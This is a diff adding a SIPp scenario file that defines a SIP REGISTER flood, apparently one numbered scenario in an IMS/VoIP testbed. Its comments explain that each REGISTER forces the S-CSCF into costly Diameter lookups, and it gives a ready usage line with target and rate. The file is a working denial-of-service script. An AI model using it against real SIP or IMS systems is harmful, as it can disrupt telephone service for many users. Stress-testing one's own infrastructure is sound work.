@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+<!-- register_flood.xml — V2 sub-escenario 2a: REGISTER flood (SIPp).
+     Cada REGISTER fuerza al S-CSCF por el camino costoso (Diameter SAR al HSS),
+     a diferencia del INVITE flood. Usuarios aleatorios vía [call_number].
+     Uso: sipp TARGET:PORT -sf register_flood.xml -m COUNT -r RATE -l MAX -t u1
+-->
+<scenario name="V2 REGISTER flood">
+  <send retrans="500">
+    <![CDATA[
+      REGISTER sip:[remote_ip]:[remote_port] SIP/2.0
+      Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch]
+      From: <sip:regflood[call_number]@[remote_ip]>;tag=[call_number]
+      To: <sip:regflood[call_number]@[remote_ip]>
+      Call-ID: regflood-[call_number]@[local_ip]
+      CSeq: 1 REGISTER
+      Contact: <sip:regflood[call_number]@[local_ip]:[local_port]>
+      Expires: 3600
+      Content-Length: 0
+    ]]>
+  </send>
+</scenario>
